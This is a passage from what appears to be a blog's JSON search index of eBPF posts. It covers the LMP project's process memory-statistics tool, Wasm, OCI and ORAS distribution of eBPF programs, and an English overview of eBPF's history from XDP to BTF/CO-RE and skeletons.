\u6210\u5458\u4e2d\u5b58\u5728\u4e00\u4e2a\u4fdd\u5b58\u8fdb\u7a0b\u5f53\u524d\u5185\u5b58\u4f7f\u7528\u72b6\u6001\u7684\u6570\u7ec4\u7ed3\u6784\uff0c\u56e0\u6b64\u6709\u5173\u8fdb\u7a0b\u7684\u5927\u90e8\u5206\u5185\u5b58\u4f7f\u7528\u4fe1\u606f\u90fd\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u6570\u7ec4\u83b7\u5f97\u3002</li> <li>\u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u51fd\u6570\u7684\u63d2\u5165\u70b9\uff0c\u63d2\u5165\u70b9\u7684\u9009\u53d6\u5173\u7cfb\u5230\u6570\u636e\u51c6\u786e\u6027\u662f\u5426\u5f97\u5230\u4fdd\u8bc1\uff0c\u800c\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u91ca\u653e\uff0c\u89c4\u6574\u7b49\u4ee3\u7801\u8def\u5f84\u4e0a\u90fd\u5b58\u5728\u9875\u9762\u72b6\u6001\u6539\u53d8\uff0c\u4f46\u662f\u6570\u91cf\u4fe1\u606f\u8fd8\u6ca1\u6709\u66f4\u65b0\u7684\u76f8\u5173\u7ed3\u6784\u4e2d\u7684\u60c5\u51b5\uff0c\u5982\u679c\u63d2\u5165\u70b9\u8fd9\u4e24\u8005\u4e2d\u95f4\uff0c\u6570\u636e\u5c31\u4f1a\u548c\u5b9e\u9645\u60c5\u51b5\u5b58\u5728\u5dee\u5f02\uff0c\u6240\u6709\u5728\u786e\u4fdd\u53ef\u4ee5\u83b7\u53d6\u5230\u8fdb\u7a0b PCB \u7684\u524d\u63d0\u4e0b\uff0c\u9009\u62e9\u5728\u8fdb\u7a0b\u8c03\u5ea6\u4ee3\u7801\u8def\u5f84\u4e0a\u8003\u8651\u3002\u800c finish_task_switch \u51fd\u6570\u662f\u65b0\u4e00\u4e2a\u8fdb\u7a0b\u7b2c\u4e00\u4e2a\u6267\u884c\u7684\u51fd\u6570\uff0c\u505a\u7684\u4e8b\u5374\u662f\u7ed9\u4e0a\u4e00\u4e2a\u88ab\u8c03\u5ea6\u51fa\u53bb\u7684\u8fdb\u7a0b\u505a\u6536\u5c3e\u5de5\u4f5c\uff0c\u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e0a\u4e00\u4e2a\u8fdb\u7a0b\u7684 PCB\uff0c\u4ece\u8fd9\u5757\u83b7\u5f97\u4e0a\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u4fe1\u606f\u5c31\u53ef\u4ee5\u786e\u4fdd\u5728\u5b83\u6ca1\u6709\u518d\u6b21\u88ab\u8c03\u5ea6\u4e0a CPU \u6267\u884c\u7684\u8fd9\u6bb5\u65f6\u95f4\u5185\u7684\u5185\u5b58\u6570\u636e\u7a33\u5b9a\u6027\u3002</li> <li>\u56e0\u6b64\u6700\u540e\u9009\u62e9\u5c06\u7a0b\u5e8f\u6302\u8f7d\u5230 finish_task_switch \u51fd\u6570\u4e0a\u3002\u6570\u636e\u6765\u6e90\u6709\u4e24\u90e8\u5206\uff0c\u4e00\u4e2a\u662f mm_struct \u7ed3\u6784\u672c\u8eab\u5b58\u5728\u7684\u72b6\u6001\u4fe1\u606f\uff0c\u53e6\u4e00\u4e2a\u662f\u5728 mm_rss_stat \u7ed3\u6784\u4e2d\u3002</li> </ul> <p>\u4e5f\u53ef\u4ee5\u5728 bolipi \u7684\u5e73\u53f0\u4e2d\u5728\u7ebf\u7f16\u8bd1\uff0c\u5728\u7ebf\u4f53\u9a8c\u8fd0\u884c eBPF \u7a0b\u5e8f\uff1ahttps://bolipi.com/ebpf/home/online</p> <p>\u5b8c\u6574\u7684\u4ee3\u7801\u3001\u6587\u6863\u548c\u8fd0\u884c\u7ed3\u679c\u53ef\u4ee5\u5728 LMP \u4e2d eBPF_Supermarket \u5904\u627e\u5230\uff1aeBPF_Supermarket/Memory_Subsystem/memstat/procstat</p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#_2","title":"\u76f8\u5173\u80cc\u666f","text":"<p>LMP \u9879\u76ee\u7684\u6210\u7acb\u521d\u8877\u662f\uff1a</p> <ul> <li>\u9762\u5411 eBPF \u521d\u5b66\u8005\u548c\u7231\u597d\u8005\uff0c\u63d0\u4f9b eBPF \u5b66\u4e60\u8d44\u6599\u3001\u7a0b\u5e8f/\u9879\u76ee\u6848\u4f8b\uff0c\u6784\u5efa eBPF \u5b66\u4e60\u793e\u533a</li> <li>\u6210\u4e3a eBPF \u5de5\u5177\u96c6\u6563\u5730\uff0c\u6211\u4eec\u76f8\u4fe1\u6bcf\u4e00\u4f4d eBPF \u521d\u5b66\u8005\u548c\u7231\u597d\u8005\u90fd\u6709\u65e0\u9650\u7684\u521b\u9020\u529b</li> <li>\u5b75\u5316 eBPF \u60f3\u6cd5\u3001\u76f8\u5173\u5de5\u5177\u3001\u9879\u76ee</li> </ul> <p>LMP \u76ee\u524d\u5206\u4e3a\u56db\u4e2a\u5b50\u9879\u76ee\uff1a</p> <ul> <li>eBPF_Supermarket \u4e2d\u5305\u542b\u4e86\u5927\u91cf\u7531\u4e2a\u4eba\u5f00\u53d1\u8005\u7f16\u5199\u7684 eBPF \u5de5\u5177\uff0c\u8986\u76d6\u4e86\u7f51\u7edc\u3001\u6027\u80fd\u5206\u6790\u3001\u5b89\u5168\u7b49\u591a\u79cd\u529f\u80fd\uff1b</li> <li>eBPF_Hub \u662f\u89c4\u8303\u5316\u7684 eBPF \u7a0b\u5e8f\u5e93\uff0c\u53ef\u4ee5\u968f\u65f6\u4e0b\u8f7d\u8fd0\u884c\uff1b</li> <li>eBPF_Visualization \u662f\u4e3a eBPF \u7a0b\u5e8f\u7ba1\u7406\u800c\u5f00\u53d1\u7684 web \u7ba1\u7406\u7cfb\u7edf\uff0c\u805a\u7126 eBPF \u6570\u636e\u53ef\u89c6\u5316\u548c\u5185\u6838\u53ef\u89c6\u5316\uff1b</li> <li>eBPF_Documentation \u4e3a\u793e\u533a\u6536\u96c6\u3001\u68b3\u7406\u548c\u539f\u521b\u7684 eBPF \u76f8\u5173\u8d44\u6599\u548c\u6587\u6863\u3002</li> </ul> <p>\u5f53\u524d LMP \u9879\u76ee\u4e5f\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u4f8b\u5982\u5bf9\u4e8e eBPF \u5de5\u5177\u7684\u5f00\u53d1\u8005\uff0c\u5b58\u5728\u975e\u5e38\u591a\u800c\u4e14\u590d\u6742\u7684\u7528\u6237\u6001\u53ef\u89c6\u5316\u3001\u5c55\u793a\u65b9\u6848\uff0c\u6709\u8bb8\u591a\u5957\u7cfb\u7edf\u63d0\u4f9b\u53ef\u89c6\u5316\u7684\u5b9e\u73b0\u5e76\u4e14\u6709\u591a\u79cd\u8bed\u8a00\u6df7\u5408\uff0c\u7f3a\u4e4f\u5c55\u793a\u6807\u51c6\u3001\u4e5f\u96be\u4ee5\u8fdb\u884c\u53ef\u89c6\u5316\u7684\u6574\u5408\u7b49\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5e0c\u671b\u5c1d\u8bd5\u501f\u52a9 eunomia-bpf \u63d0\u4f9b\u7684\u7b26\u5408 OCI \u6807\u51c6\u7684 Wasm \u548c eBPF \u7a0b\u5e8f\uff0c\u63d0\u4f9b\u6807\u51c6\u5316\u3001\u9ad8\u53ef\u6269\u5c55\u6027\u7684\u57fa\u4e8e eBPF \u7684\u53ef\u89c6\u5316\u3001\u6570\u636e\u5c55\u793a\u3001\u5206\u6790\u5e73\u53f0\uff0c\u5229\u7528 ORAS \u7b80\u5316\u6269\u5c55 eBPF \u7684\u5206\u53d1\u3001\u52a0\u8f7d\u3001\u8fd0\u884c\u80fd\u529b\uff0c\u4e3a eBPF \u5de5\u5177\u7684\u5f00\u53d1\u8005\u548c\u4f7f\u7528\u8005\u63d0\u4f9b\u66f4\u52a0\u7b80\u5355\u3001\u9ad8\u6548\u7684\u4f53\u9a8c\u3002</p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#webassembly","title":"WebAssembly","text":"<p>WebAssembly \u662f\u4e00\u79cd\u65b0\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5728\u73b0\u4ee3\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c \uff0d \u5b83\u662f\u4e00\u79cd\u4f4e\u7ea7\u7684\u7c7b\u6c47\u7f16\u8bed\u8a00\uff0c\u5177\u6709\u7d27\u51d1\u7684\u4e8c\u8fdb\u5236\u683c\u5f0f\uff0c\u53ef\u4ee5\u63a5\u8fd1\u539f\u751f\u7684\u6027\u80fd\u8fd0\u884c\uff0c\u5e76\u4e3a\u8bf8\u5982 c\\c++ \u7b49\u8bed\u8a00\u63d0\u4f9b\u4e00\u4e2a\u7f16\u8bd1\u76ee\u6807\uff0c\u4ee5\u4fbf\u5b83\u4eec\u53ef\u4ee5\u5728 Web \u4e0a\u8fd0\u884c\u3002\u5b83\u4e5f\u88ab\u8bbe\u8ba1\u4e3a\u53ef\u4ee5\u4e0e JavaScript \u5171\u5b58\uff0c\u5141\u8bb8\u4e24\u8005\u4e00\u8d77\u5de5\u4f5c\u3002\u800c\u4e14\uff0c\u66f4\u68d2\u7684\u662f\uff0c\u8fd9\u662f\u901a\u8fc7 W3C WebAssembly Community Group \u5f00\u53d1\u7684\u4e00\u9879\u7f51\u7edc\u6807\u51c6\uff0c\u5e76\u5f97\u5230\u4e86\u6765\u81ea\u5404\u5927\u4e3b\u8981\u6d4f\u89c8\u5668\u5382\u5546\u7684\u79ef\u6781\u53c2\u4e0e\u3002</p> <p>\u5c3d\u7ba1 WebAssembly \u662f\u4e3a\u8fd0\u884c\u5728 Web \u4e0a\u8bbe\u8ba1\u7684\uff0c\u5b83\u4e5f\u53ef\u4ee5\u5728\u5176\u5b83\u7684\u73af\u5883\u4e2d\u826f\u597d\u5730\u8fd0\u884c\u3002\u5305\u62ec\u4ece\u7528\u4f5c\u6d4b\u8bd5\u7684\u6700\u5c0f\u5316 shell \uff0c\u5230\u5b8c\u5168\u7684\u5e94\u7528\u73af\u5883 \u2014\u2014 \u4f8b\u5982\uff1a\u5728\u6570\u636e\u4e2d\u5fc3\u7684\u670d\u52a1\u5668\u3001\u7269\u8054\u7f51\uff08IoT\uff09\u8bbe\u5907\u6216\u8005\u662f\u79fb\u52a8/\u684c\u9762\u5e94\u7528\u7a0b\u5e8f\u3002\u751a\u81f3\uff0c\u8fd0\u884c\u5d4c\u5165\u5728\u8f83\u5927\u7a0b\u5e8f\u91cc\u7684 WebAssembly \u4e5f\u662f\u53ef\u884c\u7684\u3002\u901a\u5e38\uff0c\u901a\u8fc7\u7ef4\u6301\u4e0d\u9700\u8981 Web API \u7684\u975e Web \u8def\u5f84\uff0cWebAssembly \u80fd\u591f\u5728\u8bb8\u591a\u5e73\u53f0\u4e0a\u7528\u4f5c\u4fbf\u643a\u5f0f\u7684\u4e8c\u8fdb\u5236\u683c\u5f0f\uff0c\u4e3a\u79fb\u690d\u6027\u3001\u5de5\u5177\u548c\u8bed\u8a00\u65e0\u5173\u6027\u5e26\u6765\u5de8\u5927\u7684\u597d\u5904\u3002\uff08\u56e0\u4e3a\u5b83\u652f\u6301 c\\c++ \u7ea7\u8bed\u4e49\uff09</p> <p>Wasm \u7684\u7f16\u8bd1\u548c\u90e8\u7f72\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p>\u200b wasm-compile-deploy</p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#ociopen-container-initiative","title":"OCI(Open Container Initiative)","text":"<p>\u5f00\u653e\u5bb9\u5668\u534f\u8bae(OCI)\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\uff0c\u5f00\u653e\u7684\u6cbb\u7406\u7ed3\u6784\uff0c\u4e3a\u5bb9\u5668\u6280\u672f\u5b9a\u4e49\u4e86\u89c4\u8303\u548c\u6807\u51c6\u3002\u5728 Linux \u57fa\u91d1\u4f1a\u7684\u652f\u6301\u4e0b\u6210\u7acb\uff0c\u7531\u5404\u5927\u8f6f\u4ef6\u4f01\u4e1a\u6784\u6210\uff0c\u81f4\u529b\u4e8e\u56f4\u7ed5\u5bb9\u5668\u683c\u5f0f\u548c\u8fd0\u884c\u65f6\u521b\u5efa\u5f00\u653e\u7684\u884c\u4e1a\u6807\u51c6\u3002\u5176\u4e2d\u5305\u62ec\u4e86\u4f7f\u7528 Container Registries \u8fdb\u884c\u5de5\u4f5c\u7684 API\uff0c\u6b63\u5f0f\u540d\u79f0\u4e3a OCI \u5206\u53d1\u89c4\u8303(\u53c8\u540d\u201cdistribution-spec\u201d)\u3002\u8fd9\u4e2a\u53d1\u5e03\u89c4\u8303\u662f\u57fa\u4e8e Docker \u516c\u53f8\u6700\u521d\u53d1\u5e03\u7684\u5f00\u6e90\u6ce8\u518c\u670d\u52a1\u5668\u7f16\u5199\u7684\uff0c\u5b83\u5b58\u5728\u4e8e GitHub \u7684distribution/distribution\uff08\u73b0\u5728\u662fCNCF\u9879\u76ee\uff09\u4e0a\u3002</p> <p>OCI \u76ee\u524d\u63d0\u51fa\u7684\u89c4\u8303\u6709\u5982\u4e0b\u8fd9\u4e9b\uff1a</p> \u540d\u79f0 \u7248\u672c Runtime Specification v1.0.2 Image Format v1.0.2 Distribution Specification v1.0.1 <p>\u5176\u4e2d runtime \u548c image \u7684\u89c4\u8303\u90fd\u5df2\u7ecf\u6b63\u5f0f\u53d1\u5e03\uff0c\u800c distribution \u7684\u8fd8\u5728\u5de5\u4f5c\u4e4b\u4e2d\u3002runtime \u89c4\u8303\u4e2d\u4ecb\u7ecd\u4e86\u5982\u4f55\u8fd0\u884c\u89e3\u538b\u7f29\u5230\u78c1\u76d8\u4e0a\u7684 <code>Filesystem Bundle</code>\u3002\u5728 OCI \u6807\u51c6\u4e0b\uff0c\u8fd0\u884c\u4e00\u4e2a\u5bb9\u5668\u7684\u8fc7\u7a0b\u5c31\u662f\u4e0b\u8f7d\u4e00\u4e2a OCI \u7684\u955c\u50cf\uff0c\u5c06\u5176\u89e3\u538b\u5230\u67d0\u4e2a <code>Filesystem Bundle</code> \u4e2d\uff0c\u7136\u540e\u67d0\u4e2a OCI Runtime \u5c31\u4f1a\u8fd0\u884c\u8fd9\u4e2a Bundle\u3002</p> <p>\u4f34\u968f\u7740 image spec \u4e0e distribution spec \u7684\u6f14\u5316\uff0c\u4eba\u4eec\u5f00\u59cb\u9010\u6b65\u8ba4\u8bc6\u5230\u9664\u4e86 Container Images \u4e4b\u5916\uff0cRegistries \u8fd8\u80fd\u591f\u7528\u6765\u5206\u53d1 Kubernetes Deployment Files, Helm Charts, docker-compose, CNAB \u7b49\u4ea7\u7269\u3002\u5b83\u4eec\u53ef\u4ee5\u5171\u7528\u540c\u4e00\u5957 API\uff0c\u540c\u4e00\u5957\u5b58\u50a8\uff0c\u5c06 Registries \u4f5c\u4e3a\u4e00\u4e2a\u4e91\u5b58\u50a8\u7cfb\u7edf\u3002\u8fd9\u5c31\u4e3a\u5e26\u6765\u4e86 OCI Artifacts \u7684\u6982\u5ff5\uff0c\u7528\u6237\u80fd\u591f\u628a\u6240\u6709\u7684\u4ea7\u7269\u90fd\u5b58\u50a8\u5728 OCI \u517c\u5bb9\u7684 Registiry \u5f53\u4e2d\u5e76\u8fdb\u884c\u5206\u53d1\u3002\u4e3a\u6b64\uff0cMicrosoft \u5c06 oras \u4f5c\u4e3a\u4e00\u4e2a client \u7aef\u5b9e\u73b0\u6350\u8d60\u7ed9\u4e86\u793e\u533a\uff0c\u5305\u62ec Harbor \u5728\u5185\u7684\u591a\u4e2a\u9879\u76ee\u90fd\u5728\u79ef\u6781\u7684\u53c2\u4e0e\u3002</p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#orasoci-registry-as-storage","title":"ORAS(OCI Registry As Storage)","text":"<p>Registries \u6b63\u5728\u9010\u6e10\u6f14\u53d8\u4e3a\u901a\u7528\u7684\u7ec4\u4ef6\u5b58\u50a8\u5e93\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e00\u76ee\u6807\uff0cORAS \u9879\u76ee\u63d0\u4f9b\u4e86\u4e00\u79cd\u5c06 OCI Artifacts \u4ece OCI Registries \u63d0\u4ea4\u548c\u62c9\u53d6\u7684\u65b9\u6cd5\u3002\u6b63\u5728\u5bfb\u6c42\u901a\u7528 Registries \u5ba2\u6237\u7aef\u7684\u7528\u6237\u53ef\u4ee5\u4eceORAS CLI\u4e2d\u5f97\u5230\u5e2e\u52a9\uff0c\u800c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u5728ORAS \u5ba2\u6237\u7aef\u7684\u5f00\u53d1\u5e93\u4e4b\u4e0a\u6784\u5efa\u81ea\u5df1\u7684\u5ba2\u6237\u7aef\u3002</p> <p>ORAS \u7684\u5de5\u4f5c\u539f\u7406\u4e0e\u60a8\u53ef\u80fd\u5df2\u7ecf\u719f\u6089\u7684\u5de5\u5177(\u5982 docker)\u7c7b\u4f3c\u3002\u5b83\u5141\u8bb8\u60a8\u5411 OCI Registries \u63a8\u9001(\u4e0a\u4f20)\u548c\u63d0\u53d6(\u4e0b\u8f7d)\u5185\u5bb9\uff0c\u5e76\u5904\u7406\u767b\u5f55(\u8eab\u4efd\u9a8c\u8bc1)\u548c\u4ee4\u724c\u6d41(\u6388\u6743)\u3002ORAS \u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u5c06\u7126\u70b9\u4ece\u5bb9\u5668\u6620\u50cf\u8f6c\u79fb\u5230\u5176\u4ed6\u7c7b\u578b\u7684\u7ec4\u4ef6\u4e0a\u3002</p> <p>\u56e0\u6b64\uff0c\u9f13\u52b1\u65b0\u7684 OCI Artifacts \u7684\u4f5c\u8005\u5b9a\u4e49\u4ed6\u4eec\u81ea\u5df1\u7684\u7ec4\u4ef6\u5a92\u4f53\u7c7b\u578b\uff0c\u4ee5\u4f7f\u5f97\u4ed6\u4eec\u7684\u7528\u6237\u77e5\u9053\u5982\u4f55\u5bf9\u5176\u8fdb\u884c\u64cd\u4f5c\u3002</p> <p>\u5982\u679c\u60a8\u5e0c\u671b\u7acb\u5373\u5f00\u59cb\u53d1\u5e03 OCI Artifacts\uff0c\u8bf7\u67e5\u770bORAS CLI\u3002\u5e0c\u671b\u63d0\u4f9b\u7ed9\u81ea\u5df1\u7528\u6237\u4f53\u9a8c\u7684\u5f00\u53d1\u4eba\u5458\u5e94\u8be5\u4f7f\u7528\u4e00\u4e2a ORAS \u5ba2\u6237\u7aef\u5f00\u53d1\u5e93\u3002</p>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#_3","title":"\u672a\u6765\u7684\u53d1\u5c55\u65b9\u5411","text":"<p>\u672a\u6765 LMP \u4f1a\u4e13\u6ce8\u4e8e\u66f4\u591a\u7684\u57fa\u4e8e eBPF \u7684\u5e94\u7528\u5de5\u5177\u548c\u5b9e\u8df5\u7684\u5f00\u53d1\uff1a</p> <ol> <li>\u8fdb\u4e00\u6b65\u5b8c\u5584 ORAS \u548c OCI \u955c\u50cf\u76f8\u5173\u7684\u652f\u6301\uff1b</li> <li>\u91cd\u6784\u5e76\u8fc1\u79fb\u73b0\u6709\u7684 eBPF \u5de5\u5177\uff0c\u63d0\u4f9b\u5b8c\u6574\u7684\u3001\u5f00\u7bb1\u5373\u7528\u7684\u5206\u6790\u5de5\u5177\u7ec4\u4ef6\uff0c\u4f8b\u5982\u6027\u80fd\u5de5\u7a0b\u7b49\u65b9\u9762\uff1b</li> <li>\u63a2\u7d22\u548c\u5b75\u5316\u66f4\u591a\u7684 eBPF \u60f3\u6cd5\u3001\u76f8\u5173\u5de5\u5177\u3001\u9879\u76ee\uff1b</li> </ol> <p>\u6211\u4eec\u6240\u57fa\u4e8e\u7684 eunomia-bpf \u9879\u76ee\u4e5f\u4f1a\u7ee7\u7eed\u5b8c\u5584\uff0c\u4e13\u6ce8\u4e8e\u63d0\u4f9b\u4e00\u4e2a\u5e95\u5c42\u7684 eBPF \u5f00\u53d1\u5e73\u53f0\u548c\u8fd0\u884c\u65f6\u57fa\u7840\u8bbe\u65bd\uff0c\u529b\u6c42\u5e26\u6765\u66f4\u597d\u7684\u5f00\u53d1\u548c\u79fb\u690d\u4f53\u9a8c\uff1a</p> <ol> <li>\u6d4b\u8bd5\u66f4\u591a\u5e73\u53f0\u548c\u5185\u6838\u7248\u672c\u7684\u652f\u6301\uff0c\u76ee\u524d\u5df2\u7ecf\u5728 <code>ARM64</code> \u548c <code>x86_64</code> \u4e0a\u6210\u529f\u79fb\u690d\u5e76\u8fd0\u884c\uff0c\u63a5\u4e0b\u6765\u4f1a\u5bf9\u4f4e\u5185\u6838\u7248\u672c\u3001Android\u3001RISC-V \u7b49\u5e73\u53f0\uff0c\u4ee5\u53ca\u5d4c\u5165\u5f0f\u3001\u8fb9\u7f18\u8ba1\u7b97\u76f8\u5173\u7684\u8bbe\u5907\u8fdb\u884c\u66f4\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5\uff1b\u4e5f\u8bb8\u5728\u672a\u6765\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u63d0\u4f9b Windows \u4e0a\u7684 eBPF \u7a0b\u5e8f\u652f\u6301\u548c\u7c7b\u4f3c\u7684\u5f00\u53d1\u4f53\u9a8c\uff1b</li> <li>\u63d0\u4f9b\u6807\u51c6\u5316\u3001\u7a33\u5b9a\u7684 JSON \u548c Wasm \u63a5\u53e3\u534f\u8bae\u89c4\u8303\u4ee5\u53ca OCI \u955c\u50cf\u89c4\u8303\uff0c\u4e0d\u548c\u4efb\u4f55\u7684\u4f9b\u5e94\u5546\u6216\u4e91\u670d\u52a1\u7ed1\u5b9a\u3002\u5982\u679c\u4e0d\u4f7f\u7528 eunomia-bpf \u76f8\u5173\u7684\u5e95\u5c42\u8fd0\u884c\u65f6\uff0c\u6216\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684 Wasm \u8fd0\u884c\u65f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6807\u51c6\u5316\u7684\u63a5\u53e3\u6765\u4f7f\u7528 LMP \u4e2d\u5df2\u7ecf\u6709\u7684\u5927\u91cf eBPF \u7a0b\u5e8f\u751f\u6001\u3002</li> <li>\u63d0\u4f9b\u66f4\u53cb\u597d\u7684\u7528\u6237\u6001\u5f00\u53d1\u63a5\u53e3\uff0c\u4ee5\u53ca\u66f4\u591a\u7684\u7528\u6237\u6001\u5f00\u53d1\u8bed\u8a00 SDK\uff0c\u4f8b\u5982 Go\u3001Rust\u3001Python \u7b49\uff1b</li> <li>\u8fdb\u884c\u66f4\u591a\u5173\u4e8e Wasm \u548c eBPF \u7ed3\u5408\u7684\u63a2\u7d22\uff1b</li> </ol>"},{"location":"blog/2022/10/11/%E5%A6%82%E4%BD%95%E5%9C%A8-linux-%E6%98%BE%E5%BE%AE%E9%95%9Clmp%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BC%80%E5%90%AF-ebpf-%E4%B9%8B%E6%97%85/#_4","title":"\u53c2\u8003\u8d44\u6599 &amp; \u63a8\u8350\u9605\u8bfb","text":"<ul> <li>eunomia-bpf: \u4e00\u4e2a eBPF \u7a0b\u5e8f\u52a8\u6001\u52a0\u8f7d\u6846\u67b6</li> <li>LMP project: Linux \u663e\u5fae\u955c</li> <li>OCI Registry As Storage (oras.land)</li> <li>\u5f53 Wasm \u9047\u89c1 eBPF\uff1a\u4f7f\u7528 WebAssembly \u7f16\u5199\u3001\u5206\u53d1\u3001\u52a0\u8f7d\u8fd0\u884c eBPF \u7a0b\u5e8f | \u9f99\u8725\u6280\u672f (qq.com)</li> <li>\u5f00\u653e\u5bb9\u5668\u6807\u51c6(OCI) \u5185\u90e8\u5206\u4eab (xuanwo.io)</li> <li>WebAssembly | MDN (mozilla.org)</li> <li>WebAssembly \u4e2d\u6587\u7f51|Wasm \u4e2d\u6587\u6587\u6863</li> <li>eBPF \u5728\u7ebf\u5b66\u4e60\u5e73\u53f0\uff1abolipi.com/ebpf/home/online</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/","title":"The Past, Present, and Future of eBPF and Its Path to Revolutionizing Systems","text":"<p>This blog post mainly references Alexei Starovoitov's presentation \"Modernize BPF for the Next 10 Years\" at BPFConf 2024.</p> <p>Imagine having a Swiss Army knife for your computer's core operations\u2014something that lets you peek inside how data moves, tweak processes on the fly, and monitor everything in real-time. That\u2019s exactly what eBPF (Extended Berkeley Packet Filter) offers. Over the past decade, eBPF has transformed from a simple packet filtering tool into a powerhouse for networking, observability, and security. So, what\u2019s next for eBPF? Let\u2019s dive into its journey, explore where it\u2019s headed in the next ten years, and discuss the challenges and opportunities that lie ahead. This exploration will help us understand how eBPF is shaping the future of modern systems.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#a-decade-in-review-ebpfs-journey-so-far","title":"A Decade in Review: eBPF's Journey So Far","text":""},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-did-programmable-networking-begin-with-ebpf","title":"How Did Programmable Networking Begin with eBPF?","text":"<p>Back in 2014, the networking world was facing some serious limitations. Traditional networking stacks were rigid, making it tough to implement custom packet processing logic tailored to specific needs. Enter eBPF\u2014a game-changer that allowed developers to write small programs running directly in the kernel whenever a network packet arrived. This innovation meant more control over data handling, leading to better performance and flexibility without the hassle of cumbersome network drivers.</p> <p>With eBPF, developers could create solutions that fit their exact networking requirements, paving the way for more efficient data processing and innovative networking applications. This shift marked the beginning of programmable networking, where customization and performance could go hand in hand.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#what-made-xdp-a-game-changer-for-high-speed-networking","title":"What Made XDP a Game-Changer for High-Speed Networking?","text":"<p>As eBPF gained traction in networking, a significant hurdle emerged: the <code>sk_buff</code> structure in the Linux kernel introduced too much overhead, making it difficult to achieve high speeds like 10 Gbps. While user-space networking solutions could reach these speeds, eBPF running in the kernel struggled to keep up.</p> <p>The breakthrough came with eXpress Data Path (XDP). By running eBPF programs directly within the Network Interface Card (NIC) driver, XDP significantly reduced processing overhead. This allowed for much faster packet handling, enabling high-speed networking applications that were previously out of reach.</p> <p>Tools like Katran and Cilium leveraged XDP to deliver lightning-fast networking solutions, showcasing eBPF's ability to handle high-throughput data effortlessly. XDP turned eBPF into a viable option for environments demanding top-tier network performance, solidifying its role in modern networking.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-did-btf-and-co-re-make-tracing-smarter","title":"How Did BTF and CO-RE Make Tracing Smarter?","text":"<p>As eBPF expanded into tracing and observability, developers encountered a new challenge: kernel data structures varied across different kernel versions. This inconsistency meant BPF programs had to include specific kernel headers and be recompiled for each system, complicating deployment and maintenance.</p> <p>Enter BPF Type Format (BTF) and Compile Once - Run Everywhere (CO-RE). BTF adds type information to the kernel binary (vmlinux), allowing BPF programs to understand kernel data structures without needing recompilation for each version. CO-RE, facilitated by libbpf, lets BPF programs be compiled once and run on any system, dynamically adapting to different kernel versions at load time.</p> <p>These advancements made tracing tools more robust and portable, easing the maintenance burden on developers and encouraging broader adoption of eBPF-based observability solutions. Developers could now deploy tracing tools across diverse environments without worrying about kernel version mismatches, greatly enhancing productivity and reliability.</p>"},{"location":"blog/2024/08/11/the-past-present-and-future-of-ebpf-and-its-path-to-revolutionizing-systems/#how-did-skeletons-and-global-variables-simplify-ebpf-development","title":"How Did Skeletons and Global Variables Simplify eBPF Development?","text":"<p>Writing eBPF programs in C often meant dealing with global variables that were tricky to manage from user space. These variables lived in <code>.data</code> and <code>.bss</code> sections, making interactions between user-space applications and BPF programs cumbersome and error-prone.</p> <p>The introduction of skeleton generation, powered by BTF and libbpf, changed the game. Skeletons allow developers to generate type-safe code that bridges the gap between user space and BPF programs. No more wrestling with opaque global variables! Instead, developers can interact with BPF variables in a structured and safe manner, significantly simplifying the development process.</p> <p>This not only reduces bugs but also speeds up the creation of feature-rich eBPF applications. Additionally, tools like GPTtrace leverage large language models (LLMs) to further simplify the development of eBPF programs, lowering the barrier for developers without deep OS expertise. This combination of skeletons and AI-driven tools makes eBPF development more accessible and efficient than ever 